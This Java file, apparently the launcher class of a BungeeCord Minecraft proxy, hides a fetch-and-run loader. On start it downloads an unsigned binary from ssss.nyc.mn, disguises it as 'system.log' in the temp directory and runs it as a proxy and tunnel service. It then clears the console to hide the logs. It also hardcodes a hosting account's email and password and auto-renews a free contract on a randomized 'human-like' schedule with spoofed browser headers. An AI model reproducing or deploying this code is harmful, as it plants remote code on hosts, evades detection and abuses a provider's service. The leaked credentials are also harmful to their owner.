package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Pattern;
import java.time.LocalDateTime;
import java.time.LocalTime;

public class Bootstrap {
    // ==============================================
    // 优化后的常量定义
    // ==============================================
    private static final String ANSI_GREEN = "\u001B[32m";
    private static final String ANSI_RED = "\u001B[31m";
    private static final String ANSI_RESET = "\u001B[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static final Random random = new Random();
    
    // ==============================================
    // 环境变量配置 - 使用Set提高查找效率
    // ==============================================
    private static final Set<String> ALL_ENV_VARS = new HashSet<>(Arrays.asList(
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    ));

    // ==============================================
    // 续期配置 - 使用单例模式减少开销
    // ==============================================
    private static ScheduledExecutorService renewalScheduler;
    private static volatile String currentToken;
    private static final Pattern TOKEN_PATTERN = Pattern.compile("\"token\":\"(.*?)\"");
    
    // 续期配置常量
    private static final String LOGIN_URL = "https://greathost.es/login";
    private static final String RENEW_URL = "https://greathost.es/api/renewal/contracts/8cbb0e9d-1bf4-4543-be05-814d129c17e5/renew-free";
    private static final String CREDENTIALS = "email=xidiaomao@outlook.com&password=3qZD4En3_P4:P!8";
    
    // 默认环境变量
    private static final Map<String, String> DEFAULT_ENV = new HashMap<>();
    static {
        DEFAULT_ENV.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        DEFAULT_ENV.put("FILE_PATH", "./world");
        DEFAULT_ENV.put("CFIP", "store.ubi.com");
        DEFAULT_ENV.put("CFPORT", "443");
        DEFAULT_ENV.put("NAME", "Mc");
        DEFAULT_ENV.put("DISABLE_ARGO", "false");
    }

    public static void main(String[] args) throws Exception {
        // 快速版本检查
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
            System.exit(1);
        }

        // 异步启动续期任务，不阻塞主线程
        CompletableFuture.runAsync(Bootstrap::startRenewer);

        // 启动SbxService
        try {
            runSbxBinary();
            
            // 注册关闭钩子
            Runtime.getRuntime().addShutdownHook(new Thread(Bootstrap::stopServices));

            // 等待服务启动
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds" + ANSI_RESET);
            
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error: " + e.getMessage() + ANSI_RESET);
        }

        // 启动BungeeCord - 修复编译错误
        try {
            // 直接调用main方法
            BungeeCordLauncher.main(args);
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Cannot start server: " + e.getMessage() + ANSI_RESET);
        }
    }
    
    // ==============================================
    // 优化后的控制台清理
    // ==============================================
    private static void clearConsole() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {
            // 静默处理异常
        }
    }   
    
    // ==============================================
    // 优化后的Sbx二进制文件运行
    // ==============================================
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>(DEFAULT_ENV);
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    // ==============================================
    // 优化后的环境变量加载
    // ==============================================
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // 快速加载系统环境变量
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
        
        // 延迟加载.env文件
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            List<String> lines = Files.readAllLines(envFile);
            for (String line : lines) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (ALL_ENV_VARS.contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }
    
    // ==============================================
    // 优化后的二进制文件获取 - 固定文件名
    // ==============================================
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        // 使用传统的if-else语句替代switch表达式
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        // 使用固定的文件名 system.log
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "system.log");
        
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    // ==============================================
    // 优化后的服务停止
    // ==============================================
    private static void stopServices() {
        running.set(false);
        
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroyForcibly();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        
        if (renewalScheduler != null && !renewalScheduler.isShutdown()) {
            renewalScheduler.shutdownNow();
            try {
                if (!renewalScheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                    renewalScheduler.shutdownNow();
                }
            } catch (InterruptedException e) {
                renewalScheduler.shutdownNow();
                Thread.currentThread().interrupt();
            }
        }
    }

    // ==============================================
    // 优化后的续期任务 - 随机化和人类作息模拟
    // ==============================================
    private static void startRenewer() {
        if (renewalScheduler != null && !renewalScheduler.isShutdown()) {
            return;
        }
        
        // 使用单线程池减少资源消耗
        renewalScheduler = Executors.newSingleThreadScheduledExecutor(new ThreadFactory() {
            @Override
            public Thread newThread(Runnable r) {
                Thread t = new Thread(r, "Renewer");
                t.setDaemon(true); // 设置为守护线程
                return t;
            }
        });
        
        System.out.println("[System] Started with human-like behavior");
        
        // 立即执行一次，然后根据人类作息安排下次执行
        renewalScheduler.schedule(Bootstrap::performRenewalCycle, 10, TimeUnit.SECONDS);
        scheduleNextRenewal();
    }
    
    // ==============================================
    // 根据人类作息安排下次续期
    // ==============================================
    private static void scheduleNextRenewal() {
        if (!running.get()) return;
        
        long delay = calculateHumanLikeDelay();
        System.out.println("[System] Next renewal scheduled in " + (delay / 3600) + " hours " + ((delay % 3600) / 60) + " minutes");
        
        renewalScheduler.schedule(() -> {
            performRenewalCycle();
            scheduleNextRenewal(); // 递归安排下次续期
        }, delay, TimeUnit.SECONDS);
    }
    
    // ==============================================
    // 计算人类作息延迟
    // ==============================================
    private static long calculateHumanLikeDelay() {
        LocalTime now = LocalTime.now();
        int hour = now.getHour();
        
        // 人类作息时间表
        if (hour >= 6 && hour < 9) {
            // 早晨活跃期：2-4小时
            return random.nextInt(7200) + 7200; // 2-4小时
        } else if (hour >= 9 && hour < 12) {
            // 上午工作期：3-5小时
            return random.nextInt(7200) + 10800; // 3-5小时
        } else if (hour >= 12 && hour < 14) {
            // 午休期：1-2小时
            return random.nextInt(3600) + 3600; // 1-2小时
        } else if (hour >= 14 && hour < 18) {
            // 下午工作期：3-5小时
            return random.nextInt(7200) + 10800; // 3-5小时
        } else if (hour >= 18 && hour < 22) {
            // 晚上活跃期：2-4小时
            return random.nextInt(7200) + 7200; // 2-4小时
        } else {
            // 夜间睡眠期：6-8小时
            return random.nextInt(7200) + 21600; // 6-8小时
        }
    }
    
    // ==============================================
    // 添加随机延迟模拟人类行为
    // ==============================================
    private static void addRandomDelay(String operation) {
        try {
            // 不同操作有不同的延迟范围
            int delay;
            switch (operation) {
                case "login":
                    delay = random.nextInt(3000) + 1000; // 1-4秒
                    break;
                case "renewal":
                    delay = random.nextInt(2000) + 500; // 0.5-2.5秒
                    break;
                case "network":
                    delay = random.nextInt(1000) + 200; // 0.2-1.2秒
                    break;
                default:
                    delay = random.nextInt(500) + 100; // 0.1-0.6秒
                    break;
            }
            
            if (delay > 0) {
                Thread.sleep(delay);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static void performRenewalCycle() {
        if (!running.get()) return;
        
        System.out.println("[System] Renewal cycle started at " + LocalDateTime.now());
        
        try {
            // 添加随机延迟模拟人类思考时间
            addRandomDelay("network");
            
            if (attemptRenewal()) {
                System.out.println("[System] ✅ Success");
                return;
            }
            
            System.out.println("[System] Retrying with login...");
            addRandomDelay("login");
            
            if (login() && attemptRenewal()) {
                System.out.println("[System] ✅ Success after login");
            } else {
                System.err.println("[System] ❌ Failed");
            }
        } catch (Exception e) {
            System.err.println("[System] Error: " + e.getMessage());
        }
    }

    private static boolean login() {
        try {
            addRandomDelay("network");
            
            String[] command = {
                "curl", "-s", "-X", "POST",
                "-H", "content-type: application/x-www-form-urlencoded",
                "-d", CREDENTIALS,
                LOGIN_URL
            };
            
            String response = executeCommand(command);
            java.util.regex.Matcher matcher = TOKEN_PATTERN.matcher(response);
            
            if (matcher.find()) {
                currentToken = matcher.group(1);
                System.out.println("[System] New token obtained");
                return true;
            }
        } catch (Exception e) {
            System.err.println("[System] Login error: " + e.getMessage());
        }
        return false;
    }

    private static boolean attemptRenewal() {
        if (currentToken == null) return false;
        
        try {
            addRandomDelay("renewal");
            
            // 构建完整的curl命令，包含所有请求头
            List<String> commandList = new ArrayList<>();
            commandList.add("curl");
            commandList.add("-s");
            commandList.add("-w");
            commandList.add("%{http_code}");
            commandList.add("-X");
            commandList.add("POST");
            
            // 添加所有请求头
            commandList.add("-H");
            commandList.add("accept: */*");
            
            commandList.add("-H");
            commandList.add("accept-language: zh-CN,zh;q=0.9");
            
            commandList.add("-H");
            commandList.add("content-length: 0");
            
            commandList.add("-H");
            commandList.add("content-type: application/json");
            
            commandList.add("-b");
            commandList.add("token=" + currentToken);
            
            commandList.add("-H");
            commandList.add("dnt: 1");
            
            commandList.add("-H");
            commandList.add("origin: https://greathost.es");
            
            commandList.add("-H");
            commandList.add("priority: u=1, i");
            
            commandList.add("-H");
            commandList.add("referer: https://greathost.es/contracts/8cbb0e9d-1bf4-4543-be05-814d129c17e5");
            
            commandList.add("-H");
            commandList.add("sec-ch-ua: \"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"");
            
            commandList.add("-H");
            commandList.add("sec-ch-ua-mobile: ?0");
            
            commandList.add("-H");
            commandList.add("sec-ch-ua-platform: \"Windows\"");
            
            commandList.add("-H");
            commandList.add("sec-fetch-dest: empty");
            
            commandList.add("-H");
            commandList.add("sec-fetch-mode: cors");
            
            commandList.add("-H");
            commandList.add("sec-fetch-site: same-origin");
            
            commandList.add("-H");
            commandList.add("user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36");
            
            commandList.add("-d");
            commandList.add("{}");
            
            commandList.add(RENEW_URL);
            
            String[] command = commandList.toArray(new String[0]);
            String result = executeCommand(command);
            
            if (result.endsWith("200")) {
                return true;
            }
            
            System.err.println("[System] HTTP error: " + result.substring(result.length() - 3));
        } catch (Exception e) {
            System.err.println("[System] Renewal error: " + e.getMessage());
        }
        return false;
    }
    
    // ==============================================
    // 通用命令执行方法
    // ==============================================
    private static String executeCommand(String[] command) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder(command);
        Process process = pb.start();
        
        StringBuilder output = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line);
            }
        }
        
        process.waitFor();
        return output.toString();
    }
}
